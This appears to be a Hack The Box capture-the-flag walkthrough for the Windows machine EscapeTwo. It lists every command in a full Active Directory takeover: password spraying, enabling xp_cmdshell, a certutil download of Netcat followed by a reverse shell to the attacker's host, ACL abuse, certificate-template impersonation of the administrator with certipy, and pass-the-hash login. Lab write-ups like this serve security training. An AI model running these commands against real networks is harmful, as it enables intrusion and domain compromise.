# EscapeTwo HTB Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-EscapeTwo-green?logo=hackthebox)](https://www.hackthebox.com)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)](https://github.com/HTB/Challenges)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue)](https://github.com/HTB/Challenges)
[![Topic: Active Directory](https://img.shields.io/badge/Topic-Active%20Directory-yellowgreen)](https://en.wikipedia.org/wiki/Active_Directory)

---

## Overview

EscapeTwo is an easy Windows domain machine showcasing a full AD domain takeover:
- Starting with user credentials for domain enumeration and SMB share access,
- Fixing a corrupted Excel file header to extract hidden credentials,
- Using extracted credentials for MSSQL authentication and command execution (xp_cmdshell),
- Leveraging reverse shell with Netcat and certutil for lateral movement,
- Performing password spraying on WinRM and SMB for further access,
- Enumerating and abusing AD ACLs to control certificate services user,
- Exploiting misconfigured Active Directory Certificate Services (ADCS) to impersonate domain admin,
- Finally, gaining domain admin access and retrieving the root flag.

---

## Table of Contents

- [1. Initial Enumeration](#1-initial-enumeration)
- [2. SMB Share Enumeration and File Extraction](#2-smb-share-enumeration-and-file-extraction)
- [3. Repairing Corrupted Excel File](#3-repairing-corrupted-excel-file)
- [4. Password Spraying and MSSQL Access](#4-password-spraying-and-mssql-access)
- [5. Enabling xp_cmdshell and Reverse Shell](#5-enabling-xp_cmdshell-and-reverse-shell)
- [6. Lateral Movement Using WinRM](#6-lateral-movement-using-winrm)
- [7. Active Directory Enumeration with BloodHound](#7-active-directory-enumeration-with-bloodhound)
- [8. ACL Abuse and ADCS Enumeration](#8-acl-abuse-and-adcs-enumeration)
- [9. Exploiting Vulnerable Certificate Template](#9-exploiting-vulnerable-certificate-template)
- [10. Domain Admin Access and Root Flag](#10-domain-admin-access-and-root-flag)
- [11. Stepwise PoC (click to expand)](#11-step-wise-poc)

---

## 1. Initial Enumeration
```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.232.128 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.232.128
```

- Scans all TCP ports, extracts open ports, then runs version detection and default NSE scripts on those ports.
- Open services included SMB(445), LDAP(389), Kerberos(88), and MSSQL(1433).
 ```
 echo "10.129.232.128 sequel.htb dc01.sequel.htb" | sudo tee -a /etc/hosts`
 ```
- Adds IP to hosts for domain resolution.

---

## 2. SMB Share Enumeration and File Extraction
```
netexec smb 10.129.232.128 -u rose -p 'KxEPkKe6R8su' --shares
impacket-smbclient sequel.htb/rose:'KxEPkKe6R8su'@10.129.232.128
use Accounting Department
ls
get accounts.xlsx`
```
- Lists SMB shares accessible with user `rose`.
- Downloads `accounts.xlsx` – a corrupted Excel file suspected to contain secrets.

---

## 3. Repairing Corrupted Excel File
```
file accounts.xlsx
7z x accounts.xlsx
hexedit accounts.xlsx
xxd accounts.xlsx
```
- Determine file type: `.xlsx` files are ZIP archives.
- Extraction fails due to corrupted header bytes `50 48 04 03`.
- Manual hex edit to fix header to standard ZIP magic bytes `50 4B 03 04`.
- File opens successfully, revealing credentials inside.

---

## 4. Password Spraying and MSSQL Access

`netexec smb 10.129.232.128 -u users.txt -p pass.txt`

- Password spray with user and password lists to find valid combinations (finds valid user `oscar`).

```
netexec mssql 10.129.232.128 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
impacket-mssqlclient sequel.htb/'sa:MSSQLP@ssw0rd!'@10.129.232.128
```
- Connect to MSSQL with high-privilege `sa` account using found credentials.

Enable command execution:
```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```
- Enables `xp_cmdshell` procedure to run OS commands, reveals `sequel\sql_svc` user.

---

## 5. Enabling xp_cmdshell and Reverse Shell
```
nc -lnvp 4455
python3 -m http.server 4000
```
- Start a Netcat listener and simple HTTP server locally.
- Start a Netcat listener and simple HTTP server locally.

```
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.96:4000/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';
EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.14.96 4455';
```
- Downloads Netcat to victim using `certutil`.
- Executes Netcat to connect back and spawn a reverse shell on attacker machine.

---

## 6. Lateral Movement Using WinRM
```
net user
nxc winrm sequel.htb -u Users.txt -p 'WqSZAF6CysDQbGb3'
evil-winrm -i 10.129.232.128 -u ryan -p 'WqSZAF6CysDQbGb3'
```
- Enumerate users on Windows.
- Spray Password on WinRM port 5985 to find valid login (`ryan`).
- Use Evil-WinRM to spawn remote PowerShell session as `ryan`.
- Retrieve user flag for confirmation.

---

## 7. Active Directory Enumeration with BloodHound

`bloodhound-python -u ryan -p 'WqSZAF6CysDQbGb3' -d sequel.htb -ns 10.129.232.128 -c all --zip`

- Perform comprehensive enumeration of AD structure, permissions, and sessions.
- Identify privilege escalation paths involving `ca_svc` account.

---

## 8. ACL Abuse and ADCS Enumeration
```
python owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
python dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' sequel.htb/ryan:'WqSZAF6CysDQbGb3'
```
- Change ownership and grant `FullControl` to `ryan` over `ca_svc`.
- Also we can reset `ca_svc` password via PowerView or similar tools.

---

## 9. Exploiting Vulnerable Certificate Template
 ```
 certipy shadow -account ca_svc -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' auto 
 certipy find -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -text
 certipy template -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -template 'DunderMifflinAuthentication' -save-old
 certipy req -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca 'sequel-DC01-CA' -template 'DunderMifflinAuthentication' -upn     
 administrator@sequel.htb -dns dc01.sequel.htb	
 certipy auth -pfx administrator_dc01.pfx
```
- Enumerate CA templates and spot misconfigurations.
- Modify template to remove approval requirement and enable client authentication.
- Request a certificate impersonating administrator.
- Authenticate with the certificate and extract domain admin NTLM hash.

---

## 10. Domain Admin Access and Root Flag
```
evil-winrm -i 10.128.124.12 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
whoami
type C:\Users\Administrator\Desktop\root.txt
```
- Use domain admin NTLM hash for pass-the-hash WinRM login.
- Gain full domain admin shell and capture root flag.

---

## 11. Stepwise PoC (click to expand)

- Use domain admin NTLM hash for pass-the-hash WinRM login.
- Gain full domain admin shell and capture root flag.

---

## Tools & References

- **NetExec (nxc):** Network service exploitation and spraying
- **Impacket:** SMB and MSSQL clients
- **BloodHound:** AD permission visualizer and enumeration
- **Certipy:** ADCS enumeration and exploitation
- **Evil-WinRM:** Remote PowerShell shell over WinRM
- **Standard Linux tools:** `nmap`, `netcat`, `file`, `7z`, `hexedit`

---

## Final Notes

- Master the flow from enumeration → foothold → lateral movement → escalation.
- ADCS misconfiguration remains a powerful vector in domain takeovers.
- Proper ACL management and template hardening are critical defenses.

---




